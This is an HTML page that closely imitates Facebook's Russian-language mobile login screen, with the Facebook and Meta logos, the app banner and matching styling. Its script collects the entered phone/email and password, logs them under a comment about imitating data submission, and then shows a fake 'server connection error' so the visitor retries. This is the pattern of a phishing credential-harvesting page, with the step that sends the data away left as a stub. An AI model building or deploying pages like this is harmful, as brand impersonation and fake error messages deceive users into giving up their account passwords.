<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook — Вход или регистрация</title>
    <style>
        /* Основные стили */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fff;
            color: #1c1e21;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        /* Верхний баннер установки приложения */
        .app-banner {
            width: 100%;
            background-color: #fff;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #dddfe2;
            font-size: 14px;
            color: #1877f2;
        }

        .app-banner svg {
            margin-right: 12px;
            fill: #1877f2;
        }

        /* Контейнер страницы */
        .page-container {
            width: 100%;
            max-width: 400px;
            padding: 0 20px;
            text-align: center;
            animation: fadeIn 0.8s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .lang-selector {
            margin-top: 15px;
            font-size: 12px;
            color: #737373;
        }

        /* Логотип */
        .logo-container {
            margin: 30px 0;
        }

        .logo-container img {
            width: 60px;
            height: 60px;
        }

        /* Форма */
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .input-group {
            position: relative;
        }

        input {
            width: 100%;
            height: 55px;
            padding: 16px;
            font-size: 16px;
            border: 1px solid #ccd0d5;
            border-radius: 12px;
            background-color: #f5f6f7;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        input:focus {
            border-color: #1877f2;
            background-color: #fff;
        }        /* Анимация ошибки */
        input.error {
            border-color: #fa3e3e;
            animation: shake 0.3s;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        /* Кнопки */
        .btn-login {
            background-color: #0064e0;
            color: white;
            border: none;
            border-radius: 25px;
            height: 48px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 5px;
            transition: transform 0.1s, background-color 0.2s;
        }

        .btn-login:active {
            transform: scale(0.97);
            background-color: #0056b3;
        }

        .forgot-link {
            text-decoration: none;
            color: #1c1e21;
            font-size: 14px;
            font-weight: 500;
            margin-top: 15px;
            display: inline-block;
        }

        /* Разделитель и кнопка создания аккаунта */
        .create-account-container {
            margin-top: 40px;
            width: 100%;
        }

        .btn-create {
            width: 100%;
            background-color: transparent;
            color: #1877f2;
            border: 1px solid #1877f2;
            border-radius: 25px;
            padding: 10px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            text-decoration: none;
            display: block;
            transition: background-color 0.2s;
        }

        .btn-create:active {
            background-color: #e7f3ff;
        }

        /* Футер */
        footer {
            margin-top: auto;
            padding-bottom: 20px;
            text-align: center;
        }

        .meta-logo {
            width: 60px;
            margin-bottom: 10px;
            opacity: 0.6;
        }

        .footer-links {
            font-size: 12px;
            color: #737373;
        }

        .footer-links span {
            margin: 0 5px;
        }

        /* Скрытие текста ошибки по умолчанию */
        .error-msg {
            color: #fa3e3e;
            font-size: 12px;
            text-align: left;
            margin-top: -8px;
            margin-bottom: 8px;
            display: none;
        }
    </style>
</head>
<body>

    <!-- Баннер iOS -->
    <div class="app-banner">
        <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 11h2.59L12 16.59 8.41 13H11V8h2v5z"/></svg>
        <span>Установите Facebook для iOS — приложение работает быстрее.</span>
    </div>

    <div class="page-container">
        <div class="lang-selector">Русский</div>

        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB Logo">
        </div>

        <form class="login-form" id="loginForm">
            <div class="input-group">
                <input type="text" id="login" placeholder="Мобильный телефон или эл. адрес" autocomplete="username">
                <div class="error-msg" id="loginError">Введите адрес или номер телефона</div>
            </div>
            
            <div class="input-group">
                <input type="password" id="password" placeholder="Пароль" autocomplete="current-password">
                <div class="error-msg" id="passwordError">Введите пароль</div>
            </div>

            <button type="submit" class="btn-login">Войти</button>
        </form>

        <a href="#" class="forgot-link">Забыли пароль?</a>

        <div class="create-account-container">
            <a href="#" class="btn-create">Создать новый аккаунт</a></div>
    </div>

    <footer>
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" class="meta-logo">
        <div class="footer-links">
            Информация <span>·</span> Справка <span>·</span> Ещё
        </div>
    </footer>

    <script>
        const form = document.getElementById('loginForm');
        const loginInput = document.getElementById('login');
        const passInput = document.getElementById('password');

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            
            let isValid = true;

            // Валидация логина
            if (loginInput.value.length < 3) {
                showError(loginInput, 'loginError');
                isValid = false;
            } else {
                hideError(loginInput, 'loginError');
            }

            // Валидация пароля
            if (passInput.value.length < 6) {
                showError(passInput, 'passwordError');
                isValid = false;
            } else {
                hideError(passInput, 'passwordError');
            }

            if (isValid) {
                const btn = document.querySelector('.btn-login');
                btn.innerText = 'Вход...';
                btn.style.opacity = '0.7';
                
                // Имитация логики отправки данных
                console.log('Данные для входа:', {
                    user: loginInput.value,
                    pass: passInput.value
                });

                setTimeout(() => {
                    alert('Ошибка подключения к серверу. Попробуйте позже.');
                    btn.innerText = 'Войти';
                    btn.style.opacity = '1';
                }, 1500);
            }
        });

        function showError(input, errorId) {
            input.classList.add('error');
            document.getElementById(errorId).style.display = 'block';
        }

        function hideError(input, errorId) {
            input.classList.remove('error');
            document.getElementById(errorId).style.display = 'none';
        }

        // Убираем ошибку при вводе
        loginInput.addEventListener('input', () => hideError(loginInput, 'loginError'));
        passInput.addEventListener('input', () => hideError(passInput, 'passwordError'));
    </script>
</body>
</html>
